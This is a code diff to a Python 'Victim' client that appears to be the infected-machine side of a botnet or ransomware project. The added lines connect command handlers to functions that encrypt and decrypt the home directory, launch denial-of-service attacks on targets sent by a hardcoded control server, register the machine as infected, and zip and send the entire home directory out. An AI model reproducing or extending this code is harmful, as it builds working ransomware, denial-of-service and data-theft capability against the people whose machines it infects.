@@ -4,17 +4,16 @@ import threading
 import os
 import zipfile
 from messenger import *
+from encryption import *
+from dos import *
 from os.path import expanduser
 from time import sleep
 
 PORT = 3838
 VICTIM_LISTEN_PORT = 4848
-#SERVER_IP = "10.195.114.134"
-# XXX CHANGE THIS
-SERVER_IP = "10.193.109.154"
-
-# SHOULD PROBABLY MAKE A MSG PARSER OR SOMETHING
-# XXXXX
+# SERVER_IP = "10.195.114.134"
+# Server will have a static IP
+SERVER_IP = "10.195.243.246"
 
 
 class Victim(object):
@@ -33,25 +32,24 @@ class Victim(object):
 
     def process_decrypt_files(self, msg):
         print "Decrypting files..."
+        decrypt_home(msg[0])
         return
 
     def process_dos_attack(self, msg):
-        # MSG Looks like
-        # "IP"
-        # Sleep for 0.1 since it will drop the majority of packets
         print "Target for dos attack %s" % str(msg[0])
         dos(msg[0], msg[1])
+        return
 
     def process_encrypt_files(self, msg):
         print "Encrypting files..."
-        # Calls encrypt.py
-        pass
+        encrypt_home(msg[0])
+        return
 
     def process_new_victim(self, msg):
         # The server should have list of all infected machines
         # Add to that list
         Messenger.send_message(SERVER_IP, PORT, "JOIN,")
-        print "Joined"
+        return
 
     def process_send_dir(self, msg):
         # This will send the infected computer's entire home dir
@@ -95,10 +93,9 @@ def zipdir(path, ziph):
         for file in files:
             ziph.write(os.path.join(root, file))
 
+
 # Get the IP_address
 # Was getting errors from the other way
-
-
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
